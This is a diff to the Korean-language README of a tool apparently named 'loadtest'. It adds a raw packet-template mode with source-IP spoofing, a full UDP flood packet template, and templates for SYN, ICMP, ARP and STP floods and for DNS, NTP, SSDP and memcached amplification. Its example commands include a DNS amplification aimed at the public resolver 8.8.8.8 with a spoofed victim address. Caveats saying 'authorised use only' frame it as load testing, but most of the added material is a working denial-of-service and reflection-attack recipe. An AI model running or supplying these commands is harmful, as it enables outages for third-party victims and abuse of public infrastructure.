@@ -102,6 +102,9 @@ make build
 | `--window-size` | `64` | slow-read용 TCP 윈도우 크기 |
 | `--post-size` | `1024` | http-flood용 POST 데이터 크기 |
 | `--requests-per-conn` | `100` | http-flood용 연결당 요청 수 |
+| `--packet-template` | `` | raw 전략용 패킷 템플릿 파일 |
+| `--spoof-ips` | `` | 스푸핑할 IP 주소 (쉼표 구분, raw 전략) |
+| `--random-spoof` | `false` | 랜덤 소스 IP 사용 (raw 전략) |
 
 ### 사용 가능한 전략
 
@@ -114,6 +117,8 @@ make build
 | `slow-post` | 느린 POST 바디 전송 |
 | `slow-read` | 느린 응답 읽기 |
 | `http-flood` | 대량 요청 플러딩 |
+| `tcp-flood` | TCP 연결 풀 고갈 |
+| `raw` | Raw 패킷 템플릿 공격 (L2/L3/L4) |
 
 ## 예제
 
@@ -449,16 +454,127 @@ X-Keep-Alive-12345: ...\r\n
   --post-size 1024
 ```
 
+### 8. Raw 패킷 템플릿 (`--strategy raw`)
+
+**목적:** 템플릿을 사용한 저수준 L2/L3/L4 패킷 생성
+
+**작동 방식:**
+- 템플릿 파일에서 패킷 구조 로드
+- 동적 변수 지원 (@SIP, @DIP, @SPORT, @DPORT 등)
+- 체크섬 자동 계산 (IP, UDP, TCP, ICMP)
+- 길이 필드 자동 계산 (@LEN, @UDPLEN, @PLEN)
+- IPv4 및 IPv6 패킷 모두 지원
+- 전송에 raw 소켓 사용 (관리자/root 권한 필요)
+
+**템플릿 변수:**
+
+| 변수 | 크기 | 설명 |
+|------|------|------|
+| `@DMAC` | 6 | 목적지 MAC 주소 |
+| `@SMAC` | 6 | 소스 MAC 주소 |
+| `@SIP` | 4 | 소스 IPv4 주소 |
+| `@DIP` | 4 | 목적지 IPv4 주소 |
+| `@SIP6` | 16 | 소스 IPv6 주소 |
+| `@DIP6` | 16 | 목적지 IPv6 주소 |
+| `@SPORT` | 2 | 소스 포트 |
+| `@DPORT` | 2 | 목적지 포트 |
+| `@LEN` | 2 | IP 전체 길이 (자동 계산) |
+| `@PLEN` | 2 | IPv6 페이로드 길이 (자동 계산) |
+| `@UDPLEN` | 2 | UDP 길이 (자동 계산) |
+| `@IPCHK` | 2 | IP 헤더 체크섬 (자동 계산) |
+| `@UDPCHK` | 2 | UDP 체크섬 (자동 계산) |
+| `@TCPCHK` | 2 | TCP 체크섬 (자동 계산) |
+| `@ICMPCHK` | 2 | ICMP 체크섬 (자동 계산) |
+| `@DATA:N` | N | N 바이트 랜덤 데이터 |
+| `GK GG` | 2 | 랜덤 소스 포트 |
+| `KK KK KK KK` | 4 | 랜덤 4바이트 (예: TCP 시퀀스) |
+
+**사용 가능한 템플릿:**
+
+| 템플릿 | 설명 |
+|--------|------|
+| `udp_flood.txt` | UDP 플러드 패킷 |
+| `tcp_syn.txt` | TCP SYN 플러드 |
+| `icmp_echo.txt` | ICMP 핑 플러드 |
+| `dns_query.txt` | DNS 쿼리 플러드 |
+| `dns_any_query.txt` | DNS ANY 쿼리 (증폭) |
+| `ntp_monlist.txt` | NTP monlist (증폭) |
+| `ssdp_search.txt` | SSDP M-SEARCH (증폭) |
+| `memcached.txt` | Memcached stats (증폭) |
+| `arp_request.txt` | ARP 요청 플러드 |
+| `stp_bpdu.txt` | STP BPDU 공격 |
+| `ipv6_flood.txt` | IPv6 UDP 플러드 |
+| `icmpv6_echo.txt` | ICMPv6 핑 플러드 |
+
+**예제:**
+```bash
+# UDP 플러드 (템플릿 사용)
+./loadtest \
+  --target http://192.168.0.100:53 \
+  --strategy raw \
+  --packet-template templates/raw/udp_flood.txt \
+  --sessions 1000 \
+  --rate 500
+
+# TCP SYN 플러드
+./loadtest \
+  --target http://192.168.0.100:80 \
+  --strategy raw \
+  --packet-template templates/raw/tcp_syn.txt \
+  --sessions 500 \
+  --rate 200
+
+# DNS 증폭 테스트 (승인된 리플렉터 필요)
+./loadtest \
+  --target http://8.8.8.8:53 \
+  --strategy raw \
+  --packet-template templates/raw/dns_any_query.txt \
+  --spoof-ips "피해자_IP" \
+  --sessions 100 \
+  --rate 50
+```
+
+**템플릿 형식 예제 (udp_flood.txt):**
+```
+# L2 :: 이더넷 헤더
+@DMAC:6  # 목적지 MAC
+@SMAC:6  # 소스 MAC
+08 00    # 타입: IPv4
+
+# L3 :: IP 헤더
+45       # 버전 + IHL
+00       # DSCP
+@LEN:2   # 전체 길이 (자동 계산)
+00 00    # 식별자
+00 00    # 플래그 + 프래그먼트
+40       # TTL: 64
+11       # 프로토콜: UDP
+@IPCHK:2 # 체크섬 (자동 계산)
+@SIP:4   # 소스 IP
+@DIP:4   # 목적지 IP
+
+# L4 :: UDP 헤더
+GK GG    # 소스 포트 (랜덤)
+@DPORT:2 # 목적지 포트
+@UDPLEN:2  # UDP 길이 (자동 계산)
+@UDPCHK:2  # 체크섬 (자동 계산)
+
+# 페이로드
+@DATA:64 # 64바이트 랜덤 데이터
+```
+
+**참고:** Raw 패킷 공격은 관리자/root 권한이 필요합니다. Windows에서는 raw 소켓에 제한이 있어 UDP 소켓으로 대체될 수 있습니다.
+
 ### 전략 비교
 
-| 기능 | Normal | Keep-Alive | Slowloris | Slow POST | Slow Read | HTTP Flood |
-|------|--------|------------|-----------|-----------|-----------|------------|
-| **요청 완료** | Yes | Yes | No | Yes | Yes | Yes |
-| **서버 응답** | Yes | Yes | No | No | Yes | Yes |
-| **연결 재사용** | No | Yes | Yes | Yes | Yes | Yes |
-| **리소스 소진** | CPU | 연결 | 연결 | 연결 | 메모리 | CPU/대역폭 |
-| **감지 위험** | 낮음 | 낮음 | 높음 | 중간 | 중간 | 높음 |
-| **최적 대상** | 처리량 | 실제 트래픽 | 연결 풀 | 업로드 엔드포인트 | 큰 응답 | 순수 볼륨 |
+| 기능 | Normal | Keep-Alive | Slowloris | Slow POST | Slow Read | HTTP Flood | Raw |
+|------|--------|------------|-----------|-----------|-----------|------------|-----|
+| **요청 완료** | Yes | Yes | No | Yes | Yes | Yes | N/A |
+| **서버 응답** | Yes | Yes | No | No | Yes | Yes | N/A |
+| **연결 재사용** | No | Yes | Yes | Yes | Yes | Yes | No |
+| **리소스 소진** | CPU | 연결 | 연결 | 연결 | 메모리 | CPU/대역폭 | 네트워크/커널 |
+| **감지 위험** | 낮음 | 낮음 | 높음 | 중간 | 중간 | 높음 | 높음 |
+| **최적 대상** | 처리량 | 실제 트래픽 | 연결 풀 | 업로드 엔드포인트 | 큰 응답 | 순수 볼륨 | 프로토콜 테스트 |
 
 ### 각 전략을 사용하는 경우
 
@@ -495,6 +611,13 @@ X-Keep-Alive-12345: ...\r\n
 - WAF/CDN 효과 평가
 - 최대 요청 볼륨 필요
 - 애플리케이션 로직 스트레스 테스트
+
+**Raw 사용:**
+- 프로토콜 수준 테스트 (L2/L3/L4)
+- 커스텀 패킷 생성 필요
+- 네트워크 장비 테스트 (방화벽, IDS/IPS)
+- 증폭 공격 시뮬레이션 (승인된 경우만)
+- 프로토콜별 취약점 테스트
 
 ## 메트릭 이해
 
